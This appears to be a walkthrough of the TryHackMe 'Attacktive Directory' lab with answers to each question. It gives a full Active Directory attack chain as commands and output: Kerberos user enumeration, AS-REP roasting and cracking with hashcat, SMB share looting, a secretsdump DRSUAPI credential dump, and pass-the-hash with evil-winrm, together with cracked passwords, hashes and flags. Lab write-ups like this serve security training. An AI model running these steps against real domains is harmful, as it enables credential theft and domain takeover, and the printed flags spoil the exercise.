# Task 3 Enumeration Welcome to Attacktive Directory

**Notes_:_** Flags for each user account are available for submission. You can retrieve the flags for user accounts via RDP (Note: the login format is spookysec.local\User at the Window's login prompt) and Administrator via Evil-WinRM.

`map -sS -Pn -p- -T4 -vv 10.10.104.207`

### What tool will allow us to enumerate port 139/445?

Answer: `enum4linux`

### What is the NetBIOS-Domain Name of the machine?

`enum4linux -a 10.10.104.207`

```
Domain Name: THM-AD                                                           
Domain Sid: S-1-5-21-3591857110-2884097990-301047963
```

Answer: `thm-ad`

### What invalid TLD do people commonly use for their Active Directory Domain?

Answer: `.local`


# Task 4 Enumeration Enumerating Users via Kerberos

**Enumeration:**

For this box, a modified [User List](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt) and [Password List](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt) will be used to cut down on time of enumeration of users and password hash cracking. It is **NOT** recommended to brute force credentials due to account lockout policies that we cannot enumerate on the domain controller.

`curl https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt --output passwordlist.txt`
`curl https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt --output userlist.txt`

Download Kerbrute
https://github.com/ropnop/kerbrute/releases
`./kerbrute_linux_386 userenum --dc 10.10.104.207 --domain spookysec.local ../userlist.txt`

Answer: `userenum`

### What notable account is discovered? (These should jump out at you)


```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/02/23 - Ronnie Flathers @ropnop

2023/11/02 23:21:47 >  Using KDC(s):
2023/11/02 23:21:47 >   10.10.104.207:88

2023/11/02 23:21:48 >  [+] VALID USERNAME:       james@spookysec.local
2023/11/02 23:21:53 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2023/11/02 23:22:01 >  [+] VALID USERNAME:       James@spookysec.local
2023/11/02 23:22:03 >  [+] VALID USERNAME:       robin@spookysec.local
2023/11/02 23:22:33 >  [+] VALID USERNAME:       darkstar@spookysec.local
```

Answer: `svc-admin`

### What is the other notable account is discovered? (These should jump out at you)


Answer: `backup`

# Task 5 Exploitation Abusing Kerberos

### We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?

Add the user accounts to asrepusers.txt:
```
svc-admin@spookysec.local
backup@spookysec.local
```

Edit hosts file to add domain

`python ~/Desktop/impacket/examples/GetNPUsers.py services.local/ -outputfile asrep -format hashcat -usersfile asrepusers.txt`

```
Impacket v0.12.0.dev1+20230803.144057.e2092339 - Copyright 2023 Fortra

$krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL:0abe8e1aea390918293d82adc68ac1e8$938cb9cfc4a36782e548b58719f25004f4384b66f59f21a1e729a018def3d5eb60eab7c157c642c523d3b8052fb938bea6c577766f00fd1efb052342c2e7b190484fb0d898787c7ea98833cafc43dc86c045539e975d0caa7cffcdede78bb53123d9927f0d8b5f7588cedee01b61944de24e012bead305fde7c6a54624f3c8eeae3856c3bcd347418b50142c7c353bf86324b043b2dcd74fcb74463a18a865222aa20c4f25b75371bb772d39f05dbbce11db2f4a243d61268fd71c6a303403af5ba9db45943ac58572855478a80cb3c5ffe4f952e1b941d7ae4371db13b4afac2892302b707722eed22931e896f1f62f34fe
[-] User backup@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
```

Answer: `svc-admin`

### Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)

https://hashcat.net/wiki/doku.php?id=example_hashes

Answer: `Kerberos 5, etype 23, AS-REP`

### What mode is the hash?

Answer: `18200`

### Now crack the hash with the modified password list provided, what is the user accounts password?

`hashcat -a 0 -m 18200 asrep passwordlist.txt`

Answer: `management2005`

# Task 6 Enumeration Back to the Basics

**Enumeration:**

With a user's account credentials we now have significantly more access within the domain. We can now attempt to enumerate any shares that the domain controller may be giving out.

### What utility can we use to map remote SMB shares?

Answer: `smbclient`

### Which option will list shares?

`smbclient --help | grep list`

Answer: `-L`


### How many remote shares is the server listing?

```
smbclient -L spookysec.local -U svc-admin@spookysec.local --password management2005
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backup          Disk      
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to spookysec.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Answer: `6`

### There is one particular share that we have access to that contains a text file. Which share is it?

```
smbclient \\\\spookysec.local\\backup -U svc-admin@spookysec.local --password management2005
smb: \> ls
```

Answer: `backup`

### What is the content of the file?

Answer: `YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw`

### Decoding the contents of the file, what is the full contents?

https://gchq.github.io/CyberChef/
(Either use magic or its base 64 encoded)

Answer: `backup@spookysec.local:backup2517860`


# Task 7 Domain Privilege Escalation Elevating Privileges within the Domain

### What method allowed us to dump NTDS.DIT?

`python ~/Desktop/impacket/examples/secretsdump.py -just-dc spookysec.local/backup@10.10.104.207`

```
Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
```

Answer: `DRSUAPI`

### What is the Administrators NTLM hash?

Answer: `0e0363213e37b94221497260b0bcb4fc`


### What method of attack could allow us to authenticate as the user without the password?

Answer: `pass the hash`

### Using a tool called Evil-WinRM what option will allow us to use a hash?

Answer: `-H`


# Task 8 Flag Submission Flag Submission Panel

### svc-admin

`xfreerdp /v:10.10.104.207 /u:svc-admin /p:management2005 /timeout:30000`

Answer: `TryHackMe{K3rb3r0s_Pr3_4uth}`
### backup

`xfreerdp /v:10.10.104.207 /u:backup /p:backup2517860 /timeout:30000'
Answer: `TryHackMe{B4ckM3UpSc0tty!}`
### Administrator

`evil-winrm -i spookysec.local -u administrator -H 0e0363213e37b94221497260b0bcb4fc`

`type "c:\users\administrator\desktop\root.txt"`

Answer: `TryHackMe{4ctiveD1rectoryM4st3r}`



